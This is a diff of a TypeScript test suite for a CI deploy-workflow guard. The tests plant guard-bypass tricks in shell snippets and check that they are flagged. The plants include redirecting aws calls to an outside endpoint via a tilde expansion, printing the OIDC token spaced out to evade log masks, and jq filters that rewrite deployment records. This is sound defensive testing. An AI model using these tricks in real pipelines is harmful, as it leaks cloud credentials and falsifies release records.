@@ -43,6 +43,7 @@ import {
   CDK_DEPLOY_FORWARD,
   CDK_DEPLOY_ROLLBACK,
   CDK_DEPLOY_SERVICES,
+  CDK_DIFF_DOWN,
   CDK_DIFF_PROD,
   CDK_DIFF_ROLLBACK,
   CDK_FOLDER,
@@ -65,6 +66,7 @@ import {
   evaluatedLines,
   evaluateIf,
   forbiddenWordFindings,
+  foreignExpansionLines,
   functionDefinitions,
   GENERAL_WORDS,
   GUARD,
@@ -73,9 +75,11 @@ import {
   IMAGE_LAYOUT,
   IMAGE_UNPACK_RUN,
   JOB_IDS,
+  JOB_IFS,
   MASK_RUN,
   MIGRATE_LINES,
   maskingFindings,
+  migrationRecord,
   NET_JQ,
   NEWEST_RELEASE,
   NVMRC,
@@ -99,9 +103,11 @@ import {
   RUN_TASK_MIGRATE,
   RUN_TASK_PROBE,
   readShell,
+  recordRun,
   releaseFindings,
   SKOPEO_COPY,
   SMOKE_ATTEMPT,
+  STAGES,
   STOP_COMMANDS,
   STOP_HEAD,
   shellCommands,
@@ -111,6 +117,8 @@ import {
   TOOL_LINE_TEXTS,
   timeoutAndGroupFindings,
   triggerFindings,
+  unheldRecordLines,
+  wordAsRead,
   wordSplits,
 } from './deploy-workflow.ts'
 import { moduleImports } from './imports.ts'
@@ -238,6 +246,10 @@ const PINS_JOB_FINDING =
 const PINNED_13 =
   'runs as written, whole and under its own if: (PINNED_RUNS) and in its own folder: the build, the synth, the release, the push, migrate with its record and the record job, so no line of its own builds, synthesises, tags, migrates or records by another commit, context, task or environment, or runs, prints or writes what a rule reading the text would miss'
 const UNPINNED = 'runs only what PINNED_RUNS pins whole: no run of deploy.yml has a line of its own'
+// DPW-13's finding for a line of a record's writer that sets a name, runs jq or calls gh off the guard's own
+// literals (the seventh review's fourth attack).
+const RECORD_LINES =
+  'sets a name, runs jq or calls gh in a record’s writer only on a line RECORD_JOB_LINES or migrationRecordLines() holds, so nothing rewrites what a record says'
 const PINNED_10 =
   'runs as written, whole and under its own if: (PINNED_RUNS): every run of a job that holds the deploy role, or the OIDC request token that gets it, so no line of its own reads, splits, prints or sends what the job holds or hands a pinned line another input'
 const OUTPUT_PINNED = 'writes an output only from a run the guard pins whole'
@@ -2252,6 +2264,7 @@ describe('DPW-07 (C11-D61): what a log, a summary or an output can show', () => 
           GITHUB_STEP_SUMMARY: join(temp, 'summary.md'),
           STAGE: 'prod',
           MODE: 'deploy',
+          RESTORE: 'none',
         },
       })
       expect(result.status).toBe(0)
@@ -2520,7 +2533,7 @@ describe('DPW-08 (C11-D52): the way to prod', () => {
     expect(
       prodPathFindings(
         plant(
-          '          if [ "$TARGET" = prod ] && [ "$PLAN_ATTEMPT" != "$GITHUB_RUN_ATTEMPT" ]; then\n',
+          '          if [ "$PLAN_ATTEMPT" != "$GITHUB_RUN_ATTEMPT" ]; then\n',
           '          if false; then\n',
           job('prod'),
         ),
@@ -2605,8 +2618,11 @@ describe('DPW-08 (C11-D52): the way to prod', () => {
       expect(said({ PLAN_ATTEMPT: '1' })).toEqual(stale)
       expect(said({ PLAN_ATTEMPT: '' })).toEqual(stale)
       expect(said({ MODE: 'rollback', PLAN_ATTEMPT: '1' })).toEqual(stale)
-      // A restore has no prod-plan, so its attempt isn't read; its record still is.
-      expect(said({ TARGET: 'restore', PLAN_ATTEMPT: '' }).status).toBe(0)
+      // A restore is approved against prod-plan's diff too (the seventh review's fourth attack), so its attempt
+      // is held as a deploy's is, and its record still is.
+      expect(said({ TARGET: 'restore' }).status).toBe(0)
+      expect(said({ TARGET: 'restore', PLAN_ATTEMPT: '' })).toEqual(stale)
+      expect(said({ TARGET: 'restore', PLAN_ATTEMPT: '1' })).toEqual(stale)
       const moved = { status: 1, said: "fast re-check: prod's release records changed since prod-gate read them" }
       // A deploy too: a rollback recorded after prod-gate read the records, though its commit is an ancestor.
       expect(
@@ -2614,7 +2630,7 @@ describe('DPW-08 (C11-D52): the way to prod', () => {
           RECORDS: JSON.stringify([record(7), { ...record(8), payload: { ...record(8).payload, kind: 'rollback' } }]),
         }),
       ).toEqual(moved)
-      expect(said({ TARGET: 'restore', PLAN_ATTEMPT: '', RECORD_ID: '6' })).toEqual(moved)
+      expect(said({ TARGET: 'restore', RECORD_ID: '6' })).toEqual(moved)
       // A first deploy: no record then, and none now.
       expect(said({ RECORDS: '[]', RECORD_ID: '' }).status).toBe(0)
     } finally {
@@ -2782,8 +2798,8 @@ describe('DPW-09 (C11-D49, C11-D56, C11-D59, C11-D69): the gate, the bot test an
     expect(
       gate(
         plant(
-          "(needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'rollback') && ((needs.gate.outputs.target == 'prod'",
-          "needs.gate.outputs.mode != 'rollback' && ((needs.gate.outputs.target == 'prod'",
+          "(needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'rollback') && (needs.gate.outputs.target == 'prod'",
+          "needs.gate.outputs.mode != 'rollback' && (needs.gate.outputs.target == 'prod'",
           job('prod-gate'),
         ),
       ),
@@ -2822,7 +2838,7 @@ describe('DPW-09 (C11-D49, C11-D56, C11-D59, C11-D69): the gate, the bot test an
     expect(gate(plant(" && needs.synth-previous-nonprod.result == 'success'", '', job('nonprod')))).toEqual([
       at('nonprod', 'its if: runs it only once synth and synth-previous-nonprod succeeded'),
     ])
-    expect(gate(plant(" && needs.prod-plan.result == 'success')", ')', job('prod-gate')))).toEqual([
+    expect(gate(plant(" && needs.prod-plan.result == 'success' }}", ' }}', job('prod-gate')))).toEqual([
       at('prod-gate', 'its if: runs it only once gate and prod-plan succeeded'),
     ])
     // GUARDS-02: a term GitHub reads as true by its coercion or its precedence lets a bot, a drill and a failed
@@ -5038,6 +5054,7 @@ describe('DPW-13 (C11-D44, C11-D50, C11-D51, C11-D61, C11-D79; T24 item 10): wha
     expect(find('auto_merge: false, ', '', job('record-nonprod'))).toEqual([
       at('record-nonprod (Write the record)', PINNED_13),
       at('record-nonprod (Write the record)', BODY),
+      at('record-nonprod (Write the record)', RECORD_LINES),
     ])
     expect(
       find(
@@ -5049,6 +5066,7 @@ describe('DPW-13 (C11-D44, C11-D50, C11-D51, C11-D61, C11-D79; T24 item 10): wha
       at('record-nonprod (Write the record)', PINNED_13),
       at('record-nonprod (Write the record)', HELD),
       at('record-nonprod (Write the record)', 'sends a record’s body whole, with --input -'),
+      at('record-nonprod (Write the record)', RECORD_LINES),
     ])
     const end = '          one_off_end migrate "$MIGRATE_LINES" "$RUN"\n'
     const last = `          echo "migrate: recorded $COMMIT as the commit nonprod's database was migrated by" | mask | tee -a "$GITHUB_STEP_SUMMARY"\n`
@@ -5197,6 +5215,7 @@ describe('DPW-13 (C11-D44, C11-D50, C11-D51, C11-D61, C11-D79; T24 item 10): wha
       pinned,
       at('record-nonprod (Write the record)', HELD),
       at('record-nonprod (Write the record)', WHOLE),
+      at('record-nonprod (Write the record)', RECORD_LINES),
     ])
     expect(record(`echo $(echo)#;${post}`)).toEqual([pinned, refused, at('record-nonprod (Write the record)', WHOLE)])
     expect(record(`echo \${x:-a #}; ${post}`)).toEqual([
@@ -5237,12 +5256,14 @@ describe('DPW-13 (C11-D44, C11-D50, C11-D51, C11-D61, C11-D79; T24 item 10): wha
       expect(record(...lines), lines.join('; ')).toEqual([
         pinned,
         at('record-nonprod (Write the record), line 10', AS_BASH),
+        at('record-nonprod (Write the record)', RECORD_LINES),
       ])
     }
     expect(record(`y=${quoted}`, `: "\${@:y}"`)).toEqual([
       pinned,
       at('record-nonprod', RECORD),
       at('record-nonprod (Write the record), line 10', AS_BASH),
+      at('record-nonprod (Write the record)', RECORD_LINES),
     ])
     const refused = at('record-nonprod (Write the record), line 9', AS_BASH)
     expect(record('local -n r=x')).toEqual([pinned, at('record-nonprod', RECORD), refused])
@@ -8558,5 +8579,262 @@ describe('Round 7, attack 3: the ways past the allowlist (DPW-07, DPW-10)', () =
       expect(canonicalTextFindings({ X: text }), text).toContain(commands('X', 1))
     }
     expect(canonicalCommandLines(`printf -v X '%s' 1`, new Set())).toEqual([])
+  })
+})
+
+describe('Round 7, attack 4: the ways past the allowlist (DPW-07, DPW-08, DPW-10, DPW-13)', () => {
+  const SHELL = (name: string) => `${GUARD}: DPW-10 ${name}: is written in the shell shellViews() reads`
+  const TOOLS =
+    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
+  const tools = (name: string, line: number) => `${GUARD}: DPW-10 ${name}, line ${line}: ${TOOLS}`
+  const EXPANDS =
+    "expands only a name a canonical text sets, one its step's or job's env: gives from no secret or token, the one-offs' TOKEN, the assembly's folder, or the runner's outputs, summary, folder, run ids, address and commit, so no canonical text prints the OIDC request token or another credential its job holds"
+  const EVALUATES = 'evaluates as arithmetic, a subscript, an offset, a name or a prompt only what it sets itself'
+  // TASKS_OUTPUTS with one of its lines replaced by others, and the 1-based line of the first that holds `mark`.
+  const OUTPUTS = `  outputs=$(get aws cloudformation describe-stacks --stack-name "Hearth-$STAGE-Tasks" --query 'Stacks[0].Outputs' --output json)`
+  const outputsPlanted = (lines: readonly string[], mark: string) => {
+    expect(TASKS_OUTPUTS.split('\n').filter(line => line === OUTPUTS)).toHaveLength(1)
+    const planted = TASKS_OUTPUTS.replace(OUTPUTS, lines.join('\n'))
+    return { planted, line: planted.split('\n').findIndex(line => line.includes(mark)) + 1 }
+  }
+
+  // EXPAND-A4-01: a tilde in a canonical text's aws word. bash expands ~- to $OLDPWD and ~+ to $PWD, so
+  // OLDPWD=--endpoint-url then ~- "$endpoint" after --stack-name's value handed aws --endpoint-url, while the
+  // guard read ~- as a literal value. An unquoted tilde is now odd to readsAsBash() (but =~'s), an expansion to
+  // wordAsRead() and a split to wordSplits(), and PWD and OLDPWD are loaders' names.
+  it('reads an unquoted tilde as bash expands it, so no aws word stands for an option it never wrote (EXPAND-A4-01)', () => {
+    const { planted, line } = outputsPlanted(
+      [
+        '  OLDPWD=--endpoint-url',
+        '  endpoint=https://198.51.100.7',
+        OUTPUTS.replace(' --query', ' ~- "$endpoint" --query'),
+      ],
+      '~-',
+    )
+    const found = canonicalTextFindings({ TASKS_OUTPUTS: planted })
+    expect(found).toContain(SHELL('TASKS_OUTPUTS'))
+    expect(found).toContain(tools('TASKS_OUTPUTS', line))
+    // Every form of a tilde bash expands, in an aws word, is refused.
+    for (const word of ['~-', '~+', '~', '~root', '--x=~-', 'a:~-']) {
+      const aws = `x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks ${word} --output json)`
+      expect(canonicalToolLines(aws), word).toEqual([0])
+    }
+    // ...and in a text, wherever bash expands it: a word's start, a ${…}'s default, a double-quoted replacement.
+    for (const text of ['echo ~-', 'x=~+', `echo "$\{x:-~-}"`, `echo "$\{x/a/~}"`, 'x=a:~-']) {
+      expect(canonicalTextFindings({ X: text }), text).toContain(SHELL('X'))
+    }
+    // A quoted tilde, and the =~ operator, stay as they are.
+    expect(canonicalTextFindings({ X: `x=$1\nif [[ "$x" =~ ^a$ ]]; then echo "~" '~'; fi` })).toEqual([])
+    expect(wordAsRead('~-')).toBe('\0-')
+    expect(wordAsRead('"~-"')).toBe('~-')
+    expect(wordSplits('~-')).toBe(true)
+    expect(wordSplits('"~-"')).toBe(false)
+    expect(wordSplits("'~'")).toBe(false)
+  })
+
+  // EXPAND-A4-02: a value after an option's value. awsTextHeld() let any number of values follow an option, so
+  // "$where" "$endpoint" after --stack-name's value handed aws --endpoint-url as it ran. Each option now takes
+  // one value, and a list option (--services, --names, --tasks) later words that start with no expansion.
+  it('hands each aws option one value, and a list later words that start with no expansion (EXPAND-A4-02)', () => {
+    const { planted, line } = outputsPlanted(
+      [
+        '  local where=--endpoint-url endpoint=https://198.51.100.7',
+        OUTPUTS.replace(' --query', ' "$where" "$endpoint" --query'),
+      ],
+      '"$where"',
+    )
+    expect(canonicalTextFindings({ TASKS_OUTPUTS: planted })).toContain(tools('TASKS_OUTPUTS', line))
+    for (const aws of [
+      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" "$where" "$endpoint" --output json)',
+      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks "$task" "$where" --output json)',
+      'x=$(get aws ecs describe-services --cluster "$CLUSTER" --services api "$where" --output json)',
+      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" x --output json)',
+    ]) {
+      expect(canonicalToolLines(aws), aws).toEqual([0])
+    }
+    // A list's later literal words pass, as the read-back's do.
+    expect(
+      canonicalToolLines(
+        'x=$(get aws ecs describe-services --cluster "$CLUSTER" --services "hearth-$STAGE-api" "hearth-$STAGE-realtime" --output json)',
+      ),
+    ).toEqual([])
+    for (const [name, text] of Object.entries(CANONICAL_BY_NAME())) expect(canonicalToolLines(text), name).toEqual([])
+  })
+
+  // COMMANDS-A4-01: a record body's jq program, held only token by token, took a filter after the object
+  // (| if .environment == "nonprod" then .environment = "prod" …), rewriting the record the job wrote. Every
+  // line of a record's writer that sets a name, runs jq or calls gh is now one the guard writes as a literal,
+  // never read from the text that holds it.
+  it("holds every line of a record's writer that sets a name, runs jq or calls gh to the guard's own (COMMANDS-A4-01)", () => {
+    const body = `production_environment: ($environment == "prod"), payload: $payload}')`
+    const rewrites = [
+      `production_environment: ($environment == "prod"), payload: $payload} | if .environment == "nonprod" then .environment = "prod" | .payload.services = {api: "hearth-prod-api:999999", realtime: "hearth-prod-realtime:999999", worker: "hearth-prod-worker:999999"} else . end')`,
+      `production_environment: ($environment == "prod"), payload: $payload} | if .payload.kind == "deploy" then .task = ("hearth-" + "migrated") | .payload = {schema: 1, commit: .payload.commit} else . end')`,
+    ]
+    for (const stage of ['nonprod', 'prod'] as const) {
+      const id = `record-${stage}`
+      const run = recordRun(stage)
+      expect(unheldRecordLines(id, run), id).toEqual([])
+      const at = run.split('\n').findIndex(line => line.includes(body))
+      for (const rewrite of rewrites) expect(unheldRecordLines(id, run.replace(body, rewrite))).toEqual([at])
+      // The payload, the environment or a record's id set again, or another jq or gh call, is refused too.
+      for (const added of [
+        `PAYLOAD=$(jq '.services = {}' <<<"$PAYLOAD")`,
+        'ENVIRONMENT=prod',
+        `gh api "repos/$REPO/deployments" --jq '.[0].id'`,
+      ]) {
+        const lines = run.split('\n')
+        const index = lines.findIndex(line => line.trim().startsWith('PAYLOAD=$(release_payload "$KIND"'))
+        expect(index, id).toBeGreaterThanOrEqual(0)
+        lines.splice(index + 1, 0, `${/^\s*/.exec(lines[index] ?? '')?.[0] ?? ''}${added}`)
+        expect(unheldRecordLines(id, lines.join('\n')), added).toEqual([index + 1])
+      }
+    }
+    // Migrate's own record names its own environment's, from migrate's end on.
+    for (const stage of ['nonprod', 'prod'] as const) {
+      const run = PINNED_RUNS()[stage]?.Migrate?.run ?? ''
+      expect(run).toContain(migrationRecord(stage))
+      expect(unheldRecordLines(stage, run)).toEqual([])
+      const other = stage === 'nonprod' ? 'prod' : 'nonprod'
+      const swapped = run.replace(`--arg environment "${stage}"`, `--arg environment "${other}"`)
+      expect(swapped).not.toBe(run)
+      expect(unheldRecordLines(stage, swapped)).toHaveLength(1)
+    }
+    // Through deploy.yml: the plant in record-nonprod's run is found, beside the pin it breaks.
+    const RECORD_LINES =
+      'sets a name, runs jq or calls gh in a record’s writer only on a line RECORD_JOB_LINES or migrationRecordLines() holds, so nothing rewrites what a record says'
+    expect(releaseFindings(plant(body, rewrites[0] ?? '', job('record-nonprod')))).toContain(
+      `${DEPLOY}: DPW-13 record-nonprod (Write the record): ${RECORD_LINES}`,
+    )
+  })
+
+  // COMMANDS-A4-02: an echo added to AWS_CHECK printed the OIDC request token spaced out, which no mask matches,
+  // since only a run's own lines were held to the names they may expand. A canonical text now expands only a
+  // name a canonical text sets, one an env: gives from no secret or token, or the runner's own.
+  it('expands in a canonical text no name its job holds a credential in (COMMANDS-A4-02)', () => {
+    const anchor = `  echo 'go=true' >>"$GITHUB_OUTPUT"\n`
+    expect(AWS_CHECK).toContain(anchor)
+    const echo = `    echo "$\{ACTIONS_ID_TOKEN_REQUEST_TOKEN//?/& }" "$ACTIONS_ID_TOKEN_REQUEST_URL"`
+    const planted = AWS_CHECK.replace(
+      anchor,
+      `  if [ -n "$\{ACTIONS_ID_TOKEN_REQUEST_TOKEN-}" ]; then\n${echo}\n  fi\n${anchor}`,
+    )
+    const line = planted.split('\n').indexOf(echo) + 1
+    expect(line).toBeGreaterThan(0)
+    expect(canonicalTextFindings({ AWS_CHECK: planted })).toContain(
+      `${GUARD}: DPW-07 AWS_CHECK, line ${line}: ${EXPANDS}`,
+    )
+    for (const text of [
+      'echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"',
+      `printf '%s\\n' "$\{ACTIONS_ID_TOKEN_REQUEST_TOKEN:0:8}"`,
+      `echo "$\{AWS_SESSION_TOKEN//?/& }"`,
+      `echo "$\{#AWS_SECRET_ACCESS_KEY}"`,
+      'x="$GH_TOKEN"',
+      'echo "$GITHUB_TOKEN"',
+      'echo "$ACTIONS_RUNTIME_TOKEN"',
+      // A secret an env: hands its step, and a name set to itself, which bash expands first.
+      'echo "$ACCOUNT_ID"',
+      'ACTIONS_ID_TOKEN_REQUEST_TOKEN="$ACTIONS_ID_TOKEN_REQUEST_TOKEN"; echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"',
+      `local t\nt=$\{ACTIONS_ID_TOKEN_REQUEST_TOKEN}`,
+    ]) {
+      expect(foreignExpansionLines(text, ['t', 'x']).length, text).toBeGreaterThan(0)
+    }
+    // The runner's own, a step's env, a name a text sets and a jq program's own $name pass.
+    for (const text of [
+      'echo "$STAGE $RUNNER_TEMP $GITHUB_RUN_ID $GITHUB_SHA"',
+      `x=$(jq -n --arg a "$MODE" '$a')`,
+      'echo "$stop_token"',
+    ]) {
+      expect(foreignExpansionLines(text), text).toEqual([])
+    }
+    expect(canonicalTextFindings()).toEqual([])
+  })
+
+  // FLOW-A4-01: a [[ … -gt … ]] whose operand held ]] inside a ${…} (${revision// ]] /}, ${x:- ]] }) ended
+  // the tempered search before the operator, so the arithmetic was never seen. The operator is now found
+  // anywhere after a [[ on its line, and a [[ that stays open is read to its real close, past each ${…}, $( … )
+  // and parenthesis.
+  it('finds a [[ … ]] comparing as numbers wherever its operand holds ]] (FLOW-A4-01)', () => {
+    const loop = `  for kind in migrate probe; do\n    definition=$(output "$\{kind^}TaskDefinition")\n`
+    const local = '  local outputs kind definition\n'
+    expect(TASKS_OUTPUTS).toContain(loop)
+    expect(TASKS_OUTPUTS).toContain(local)
+    const test = `    if [[ "$\{revision// ]] /}" -gt 999999 ]]; then`
+    const planted = TASKS_OUTPUTS.replace(local, '  local outputs kind definition revision\n').replace(
+      loop,
+      `${loop}    revision=$\{definition##*:}\n${test}\n      exit 1\n    fi\n`,
+    )
+    const line = planted.split('\n').indexOf(test)
+    expect(line).toBeGreaterThan(0)
+    expect(evaluatedLines(planted)).toContain(line)
+    for (const text of [
+      `x=$1\n[[ "$\{x/ ]] /}" -gt 1 ]]`,
+      `x=$1\n[[ "$\{x:- ]] }" -gt 1 ]]`,
+      'x=$1\n[[ "$(echo ]] )" -gt 1 ]]',
+      'x=$1\n[[ $x =~ ( ]]) || $x -gt 1 ]]',
+    ]) {
+      expect(evaluatedLines(text), text).toEqual([1])
+    }
+    // A [[ that doesn't close on its line, wherever a ]]-shaped text stands in it.
+    for (const text of [`x=$1\n[[ "$\{x/ ]] /}" ||\n$x -gt 1 ]]`, 'x=$1\n[[ $x =~ ( ]]) ||\n$x -gt 1 ]]']) {
+      expect(evaluatedLines(text), text).toContain(1)
+    }
+    // An outside value compared as a number is refused.
+    expect(canonicalTextFindings({ X: `[[ "$\{y/ ]] /}" -gt 1 ]]` })).toContain(
+      `${GUARD}: DPW-10 X, line 1: ${EVALUATES}`,
+    )
+    // A test that closes before a pattern or regex stays as it was.
+    expect(evaluatedLines('x=$1\nif [[ "$x" =~ ^(a|b)$ ]]; then echo y; fi')).toEqual([])
+    expect(evaluatedLines(`x=$1\n[[ "$x" == a ]] && echo "$\{x}"`)).toEqual([])
+  })
+
+  // INPUTS-A4-01: a restore deployed the restore stage's stacks into prod's account behind prod's approval
+  // with no diff in any run, so a release's own code could add a grant to prod's task role only when it is
+  // rendered for a restore. prod-plan now runs for a restore, diffing the stacks it deploys (restore/* up, its
+  // Services, Data and Platform down), and prod-gate, which prod needs, requires prod-plan's success for every
+  // target.
+  it('diffs what a restore deploys before its approval, as a prod deploy is (INPUTS-A4-01)', () => {
+    const planIf = JOB_IFS['prod-plan'] ?? ''
+    const gateIf = JOB_IFS['prod-gate'] ?? ''
+    const settled = (text: string) => text.replace(/!cancelled\(\)/g, 'true')
+    const people = { 'github.triggering_actor': 'person', 'github.actor': 'person' }
+    for (const restore of ['up', 'down']) {
+      const known = {
+        ...people,
+        'needs.gate.result': 'success',
+        'needs.gate.outputs.target': 'restore',
+        'needs.gate.outputs.mode': 'deploy',
+        'needs.gate.outputs.restore': restore,
+        'needs.synth.result': 'success',
+        'needs.synth-previous-prod.result': 'success',
+        'needs.smoke-nonprod.result': 'skipped',
+      }
+      expect(evaluateIf(settled(planIf), known), restore).toBe(true)
+      for (const result of ['failure', 'cancelled', 'skipped']) {
+        expect(evaluateIf(settled(gateIf), { ...known, 'needs.prod-plan.result': result }), result).toBe(false)
+      }
+      expect(evaluateIf(settled(gateIf), { ...known, 'needs.prod-plan.result': 'success' })).toBe(true)
+    }
+    // prod-plan's stage is prod's, so its diff names the stacks prod then deploys; a restore taken down diffs
+    // the three stacks it deploys, in its order, and the summary says what it shows.
+    expect(STAGES['prod-plan']).toBe(STAGES.prod)
+    expect(DIFF_RUN).toContain(`elif [ "$RESTORE" = down ]; then\n  {\n    ${CDK_DIFF_DOWN}\n`)
+    expect(CDK_DIFF_DOWN).toContain('"$STAGE/Services" "$STAGE/Data" "$STAGE/Platform" --exclusively')
+    expect(DIFF_RUN).toContain('if [ "$STAGE" = restore ]; then echo "### What the restore changes"')
+    // The workflow as it was before: prod-plan for a prod target alone, prod-gate passing a restore without it.
+    const OLD_PLAN =
+      "needs.synth-previous-prod.result == 'success' && needs.gate.outputs.target == 'prod' && ((needs.gate.outputs.mode == 'deploy' && needs.smoke-nonprod.result == 'success') || needs.gate.outputs.mode == 'rollback') }}"
+    const NEW_PLAN =
+      "needs.synth-previous-prod.result == 'success' && ((needs.gate.outputs.target == 'prod' && ((needs.gate.outputs.mode == 'deploy' && needs.smoke-nonprod.result == 'success') || needs.gate.outputs.mode == 'rollback')) || (needs.gate.outputs.target == 'restore' && needs.gate.outputs.mode == 'deploy')) }}"
+    const OLD_GATE =
+      "((needs.gate.outputs.target == 'prod' && needs.prod-plan.result == 'success') || needs.gate.outputs.target == 'restore') }}"
+    const NEW_GATE =
+      "(needs.gate.outputs.target == 'prod' || needs.gate.outputs.target == 'restore') && needs.prod-plan.result == 'success' }}"
+    const RESTORE_PLAN =
+      'prod-plan: runs for a restore, whose prod-gate (and so prod) requires its success, so a restore is approved against its diff'
+    expect(prodPathFindings(workflows)).toEqual([])
+    for (const planted of [plant(NEW_PLAN, OLD_PLAN, job('prod-plan')), plant(NEW_GATE, OLD_GATE, job('prod-gate'))]) {
+      expect(prodPathFindings(planted)).toContain(`${DEPLOY}: DPW-08 ${RESTORE_PLAN}`)
+    }
   })
 })
